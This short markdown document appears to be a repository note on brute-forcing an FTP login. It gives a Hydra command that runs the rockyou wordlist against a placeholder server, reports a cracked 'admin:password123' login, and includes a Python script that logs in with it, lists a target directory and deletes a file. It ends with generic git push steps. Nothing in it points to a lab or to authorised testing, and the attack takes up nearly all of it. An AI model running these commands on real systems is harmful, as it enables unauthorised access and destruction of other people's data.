# Hydra Brute-Force Attack

## Command
bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<server-ip>

Output

    Successfully cracked password: admin:password123.

custom_scripts/soldier.py:

    import ftplib
    ftp = ftplib.FTP('<server-ip>')
    ftp.login('admin', 'password123')
    ftp.cwd('/target/directory')
    ftp.retrlines('LIST')
    ftp.delete('file.txt')

Push the Repository

    Add all files:

    git add .
    git commit -m "Initial commit with setup and implementation"
    git push origin main
